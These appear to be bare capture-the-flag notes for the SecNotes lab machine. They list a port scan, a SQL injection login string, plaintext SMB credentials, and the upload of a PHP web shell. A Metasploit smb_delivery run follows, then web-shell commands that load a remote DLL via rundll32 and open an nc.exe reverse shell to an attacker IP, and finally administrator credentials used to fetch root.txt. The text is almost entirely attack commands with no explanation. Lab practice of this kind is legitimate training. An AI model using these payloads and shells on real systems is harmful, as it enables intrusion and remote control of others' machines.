SecNotes

PORT    STATE SERVICE      REASON  VERSION
80/tcp  open  http         syn-ack Microsoft IIS httpd 10.0
445/tcp open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: HTB)

Username: ' or 1='1
Password: ' or 1='1
Confirm password: ' or 1='1



\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&


smbclient –L 10.10.10.97 –U tyler
password: 92g!mA8BGjOirkL%OG*&
smbclient //10.10.10.97/new-site -U tyler
Password: 92g!mA8BGjOirkL%OG*&
ls
put simple-backdoor.php
ls



use exploit/windows/smb/smb_delivery
set LHOST 10.10.14.9
set SRVHOST 10.10.14.9
exploit

http://10.10.10.97:8808/simple-backdoor.php?cmd=rundll32.exe%20\\10.10.16.8\HcCIDv\test.dll,0


10.10.10.97:8808/simple-backdoor.php?cmd=nc.exe+-e+cmd.exe+10.10.18.8+80


smbclient –U 'administrator%u6!4Zwgw0M#^0Bf#Nwnh' \\\\10.10.10.97\\c$
ls
cd Users/Administrator/Desktop
ls
get root.txt
cat root.txt

u6!4Zwgw0M#^0Bf#Nwnh